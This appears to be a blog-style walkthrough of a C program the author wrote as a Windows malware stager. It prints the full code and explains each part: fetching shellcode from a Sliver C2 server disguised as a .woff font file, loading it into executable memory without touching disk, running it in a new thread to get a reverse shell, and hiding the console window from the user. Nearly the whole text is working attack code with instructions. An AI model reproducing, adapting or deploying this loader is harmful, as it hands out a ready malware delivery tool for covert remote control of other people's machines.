How this little stager program actually works

Alright, so this is the small C program I wrote. It's nothing crazy or "Hollywood malware". It just does one job:

-   download shellcode from my Sliver C2
-   load it straight into memory
-   run it
-   then the shellcode handles the reverse shell part

So this file isn't the real payload. It's just the delivery boy.

Below is the code again, and I'll walk through what each part is doing in normal language.

#include <windows.h>\
#include <wininet.h>\
#include <stdio.h>

#pragma comment(lib, "wininet.lib")

void DownloadAndExecute() {\
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);\
    HINTERNET hConnect = InternetOpenUrlA(hInternet, "<http://10.0.3.11:1234/asmogosmo.woff>", NULL, 0, INTERNET_FLAG_RELOAD, 0);

DWORD bytesRead;\
    BYTE tempBuffer[4096];\
    BYTE* shellcode = NULL;\
    DWORD totalSize = 0;

while (InternetReadFile(hConnect, tempBuffer, sizeof(tempBuffer), &bytesRead) && bytesRead > 0) {\
        shellcode = (BYTE*)realloc(shellcode, totalSize + bytesRead);\
        memcpy(shellcode + totalSize, tempBuffer, bytesRead);\
        totalSize += bytesRead;\
    }

LPVOID addr = VirtualAlloc(NULL, totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

RtlMoveMemory(addr, shellcode, totalSize);

HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);

WaitForSingleObject(hThread, INFINITE);

InternetCloseHandle(hConnect);\
    InternetCloseHandle(hInternet);\
    free(shellcode);\
}

int main() {\
    HWND hWnd = GetConsoleWindow();\
    ShowWindow(hWnd, SW_HIDE);\
    DownloadAndExecute();\
    return 0;\
}

First, the includes

These lines:

#include <windows.h>\
#include <wininet.h>\
#include <stdio.h>

Basically say:

-   I'm going to use Windows APIs
-   I'm going to use internet functions
-   I may print or handle basic C I/O

Nothing mysterious here. Just telling the compiler what features we're using.

Linking the internet library

#pragma comment(lib, "wininet.lib")

This just says:

-   link the WinINet library
-   otherwise internet functions won't work

So this is what allows InternetOpenA and InternetOpenUrlA to actually function.

The main function that does all the real work

void DownloadAndExecute() {

This whole function is the heart of everything. Inside it, the program:

1.  connects to my server
2.  downloads shellcode
3.  puts it in memory
4.  runs it

That's it. No extra drama.

Opening the internet connection

HINTERNET hInternet = InternetOpenA("Mozilla/5.0", ...);\
HINTERNET hConnect = InternetOpenUrlA(hInternet, "<http://10.0.3.11:1234/asmogosmo.woff>", ...);

What's going on here in simple words:

-   the program says "I want internet access"
-   it uses a user-agent string that looks like a browser
-   then it connects to my URL where the payload is hosted

So at this stage, it's literally just:

download some data from my server

No "hacking magic" yet. It's just HTTP.

Downloading the shellcode into RAM

We first prepare some variables:

BYTE tempBuffer[4096];\
BYTE* shellcode = NULL;\
DWORD totalSize = 0;

Then this loop does the actual downloading:

while (InternetReadFile(hConnect, tempBuffer, sizeof(tempBuffer), &bytesRead) && bytesRead > 0) {\
    shellcode = (BYTE*)realloc(shellcode, totalSize + bytesRead);\
    memcpy(shellcode + totalSize, tempBuffer, bytesRead);\
    totalSize += bytesRead;\
}

Simple English explanation:

-   it reads the remote file in chunks
-   keeps expanding the buffer
-   sticks chunks together one after another
-   in the end, you have the entire shellcode sitting in memory

Important point: nothing is written to disk. It just sits in RAM.

Making memory that we can actually run

LPVOID addr = VirtualAlloc(NULL, totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

Here we ask Windows for a new block of memory that:

-   we can write to
-   and we can execute

That's unusual for normal apps, which is why defenders like monitoring this behavior. For us, we need it because we're going to run whatever we downloaded.

Copying the shellcode there

RtlMoveMemory(addr, shellcode, totalSize);

This is basically:

take the downloaded bytes

move them into the executable memory region

Now the shellcode is sitting in memory ready to run.

Running the shellcode

HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);\
WaitForSingleObject(hThread, INFINITE);

This part is where control actually jumps into the payload.

In plain language:

-   we start a new thread
-   tell Windows to begin execution at the address containing our shellcode
-   then we wait forever while it runs

From here on, my Sliver shellcode is in control and it's the one that connects back and gives the reverse shell.

Cleaning up nicely

InternetCloseHandle(hConnect);\
InternetCloseHandle(hInternet);\
free(shellcode);

Just closing network handles and freeing memory. Nothing fancy.

Hiding the console so it doesn't look ugly

HWND hWnd = GetConsoleWindow();\
ShowWindow(hWnd, SW_HIDE);

This just hides the black console window so the program doesn't pop up in the user's face. Cosmetic thing.
